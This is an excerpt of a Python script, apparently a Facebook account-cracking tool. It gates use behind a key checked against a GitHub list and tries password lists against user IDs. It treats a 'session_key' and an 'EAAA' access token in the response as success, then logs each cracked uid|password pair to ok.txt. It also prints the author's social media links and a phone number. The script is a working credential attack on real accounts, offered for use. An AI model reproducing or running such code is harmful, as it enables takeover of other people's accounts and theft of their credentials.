...
def notice():
	...
	os.system("xdg-open https://www.facebook.com/Rajvir.071")
	subprocess.check_output(["am", "start", "https://github.com/Rajvir071/Rajvir/blob/main/Approved-R.text"])
...
class Main:
	def __init__(self):
		...
		try:
			...
			plr = requests.get('https://github.com/Rajvir071/Rajvir/blob/main/Approved-R.text').text
			if basesplit in plr:
				key = basesplit
  ...
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;97m   [=Rajvir=OK=>] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("   [=Rajvir=OK=>]  %s|%s\n"%(uid, pw))
				break
...
if len(sys.argv) == 2:
	if sys.argv[1] == "--info":
		...
		print(" [*] Team      :  Copyright®")
		print(" [ Sosial Medi  ] \n")
		print(" [*] Facebook  : https://www.facebook.com/Rajvir.071")
		print(" [*] Number: +8801872972862 ")
		print(" [*] Facebok Page   : https://www.facebook.com/Rajvir.071 ")
		exit(" [*]     : https://github.com/Rajvir071")
	else:
		Main()
